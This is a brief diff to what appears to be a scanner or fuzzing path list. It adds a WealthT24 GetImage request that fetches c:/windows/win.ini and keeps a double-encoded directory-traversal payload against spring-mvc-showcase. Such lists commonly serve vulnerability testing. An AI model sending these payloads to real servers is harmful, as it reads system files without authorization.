@@ -1,3 +1,4 @@
+/WealthT24/GetImage?docDownloadPath=c:/windows/win.ini
 /loginServlet
 /secure/Dashboard.jspa
 /spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
